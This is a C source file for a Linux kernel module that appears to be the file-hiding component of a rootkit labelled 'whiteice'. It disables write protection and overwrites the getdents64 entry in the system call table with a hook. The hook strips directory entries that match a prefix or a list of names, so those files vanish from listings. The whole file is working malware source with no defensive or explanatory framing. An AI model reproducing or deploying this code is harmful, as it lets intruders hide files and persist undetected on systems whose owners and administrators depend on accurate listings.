#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/namei.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/syscalls.h>

#include "hook_defs.h"
#include "syscall_table.h"
#include "hide_files.h"

asmlinkage long (*original_getdents64_files)(unsigned int, struct linux_dirent64 __user *, unsigned int);

static int should_hide_file(const char *name)
{
    int i;

    if (strncmp(name, HIDE_PREFIX, HIDE_PREFIX_LEN) == 0)
        return 1;

    for (i = 0; hide_files[i] != NULL; i++) {
        if (strnstr(name, hide_files[i], strlen(name)))
            return 1;
    }

    return 0;
}

asmlinkage long hooked_getdents64_files(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)
{
    long ret = original_getdents64_files(fd, dirent, count);
    struct linux_dirent64 *d, *kbuf, *prev = NULL;
    unsigned long offset = 0;

    if (ret <= 0) return ret;

    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf) return ret;

    if (copy_from_user(kbuf, dirent, ret)) {
        kfree(kbuf);
        return ret;
    }

    while (offset < ret) {
        d = (struct linux_dirent64 *)((char *)kbuf + offset);

        if (should_hide_file(d->d_name)) {
            if (d == kbuf) {
                ret -= d->d_reclen;
                memmove(d, (char *)d + d->d_reclen, ret);
                continue;
            } else {
                prev->d_reclen += d->d_reclen;
            }
        } else {
            prev = d;
        }

        offset += d->d_reclen;
    }

    if (copy_to_user(dirent, kbuf, ret)) {
        kfree(kbuf);
        return ret;
    }

    kfree(kbuf);
    return ret;
}

void enable_hide_files_hook(unsigned long **syscall_table)
{
    original_getdents64_files = (void *)syscall_table[__NR_getdents64];
    disable_write_protection();
    syscall_table[__NR_getdents64] = (unsigned long *)hooked_getdents64_files;
    enable_write_protection();

    printk(KERN_INFO "[whiteice:hide_files] files hiden.\n");
}

void disable_hide_files_hook(unsigned long **syscall_table)
{
    disable_write_protection();
    syscall_table[__NR_getdents64] = (unsigned long *)original_getdents64_files;
    enable_write_protection();

    printk(KERN_INFO "[whiteice:hide_files] restaured.\n");
}
